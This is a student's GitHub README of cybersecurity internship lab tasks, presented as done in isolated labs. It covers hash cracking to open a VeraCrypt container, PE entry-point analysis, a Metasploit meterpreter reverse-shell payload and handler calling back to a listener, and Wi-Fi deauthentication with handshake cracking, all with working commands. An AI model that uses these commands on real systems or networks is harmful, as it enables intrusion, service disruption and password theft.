# ⚙️ Intermediate Level Cyber Security Internship Tasks – ShadowFox

This repository contains my **Intermediate Level Cyber Security Internship Tasks** completed as part of the **ShadowFox Cyber Security Internship**.

---

## 📘 Task Overview

| Task | Description | Tools Used |
|------|--------------|------------|
| **Task 1** | Decode and recover VeraCrypt password | Hashcat / John / VeraCrypt |
| **Task 2** | Find PE Entry Point in an executable | PE Explorer / Python pefile |
| **Task 3** | Create reverse shell payload using Metasploit | msfvenom / msfconsole |
| **Task 4** | Perform Wi-Fi deauth & handshake capture (own network) | Aircrack-ng / Hashcat |

---

## Overview
This repository documents four intermediate-level lab tasks completed as part of the ShadowFox Cyber Security Internship. Each task has a short description, the essential commands used, and a list of evidence files to include. All activities were performed in isolated lab environments or on systems I own.

---

## Repository structure (recommended)

<img width="568" height="256" alt="Screenshot 2025-10-30 101948" src="https://github.com/user-attachments/assets/2dc5ea28-598d-4d43-8b8e-d7dc7cf6d041" />


---

## Important: legal & safety
**Only** run these techniques on VMs, lab equipment, or networks you own and have permission to test. Do not use these techniques against third-party systems. Do not upload binaries (payloads, .exe, .cap, .hc) to public repositories.

---

## Task 1 — VeraCrypt Password Recovery
**Goal:** recover password (from an encoded/hash input) and mount the VeraCrypt container to extract a secret.

**Key commands (examples)**
```bash
# clean hex dump -> single hash line
awk '{printf "%s", $NF} END{print ""}' hashes.txt > hashes_clean.txt

# crack with john
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hashes_clean.txt

# mount veracrypt (use recovered password)
sudo veracrypt --text --mount ./practice_container.hc /mnt/veracrypt1 --password='RECOVERED_PASSWORD'
ls -la /mnt/veracrypt1
sudo cat /mnt/veracrypt1/secret.txt
```
**Evidence to include:**

veracrypt_mount_output.txt, ls_mounted.txt, secret_extracted.txt, screenshots.

##Task 2 — PE Entry Point Analysis

Goal: find AddressOfEntryPoint (RVA), ImageBase, and compute Virtual Entry Address.

**Key commands (examples):**
```bash
# install pefile (apt) and run helper script
sudo apt install -y python3-pefile
python3 pe_entry.py sample.exe > pe_entry_output.txt
```

**What pe_entry.py should print**
AddressOfEntryPoint (RVA): 0x....
ImageBase: 0x....
Virtual Entry Address: 0x....   # ImageBase + AEP
**Evidence to include:**

pe_entry.py, pe_entry_output.txt, screenshot from CFF Explorer (optional).

##Task 3 — Metasploit Reverse Shell

Goal: generate meterpreter payload, run handler, and capture reverse shell in lab VM.

**Key commands (examples)**
```bash
# create workspace and payload (DO NOT upload payload.exe)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.101 LPORT=4444 -f exe -o payload.exe

# handler resource (handler.rc)
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.56.101
set LPORT 4444
set ExitOnSession false
exploit -j -z

# run handler
msfconsole -r handler.rc
```
**Evidence to include**

handler.rc, payload_command.txt (command used), msf_session_log.txt, session_screenshot.png.

##Task 4 — Wi-Fi Deauth → Handshake → Crack (own AP only)

Goal: capture WPA/WPA2 4-way handshake from an AP you own and attempt a wordlist crack.

**Key commands (examples)**
```bash
# enable monitor mode (replace wlan0)
sudo airmon-ng check kill
sudo airmon-ng start wlan0

# focused capture
sudo airodump-ng --bssid AA:BB:CC:DD:EE:FF -c 6 -w capture wlan0mon

# deauth a client to force handshake (only on your AP)
sudo aireplay-ng --deauth 20 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon

# convert and crack (recommended)
hcxpcapngtool -o capture.22000 capture-01.cap
hashcat -m 22000 capture.22000 /usr/share/wordlists/rockyou.txt
```
**Evidence to include**

airodump_handshake.png, aireplay_deauth_output.txt, hashcat_log.txt (do not publish raw .cap unless it is your own AP).

###How to push to GitHub (quick)

```bash
git init
git add .
git commit -m "Add intermediate tasks README and structure"
git remote add origin https://github.com/<username>/cybersecurity-intermediate-tasks.git
git branch -M main
git push -u origin main
```


## ⚖️ Legal & Ethical Disclaimer
> All tasks were executed in a **controlled virtual lab** or **personal network** with permission.  
> This content is shared for learning and educational demonstration only.

---

## 👨‍💻 Author
**Nandyala Jashwanth Reddy**  
Cyber Security Intern – ShadowFox  
📍 SR University  
🔗 [LinkedIn Profile](https://www.linkedin.com/in/nandyala-jashwanth-reddy-49b4552bb/?lipi=urn%3Ali%3Apage%3Ad_flagship3_profile_view_base_contact_details%3BrdYprjFETQiIZv6riTvP1A%3D%3D)
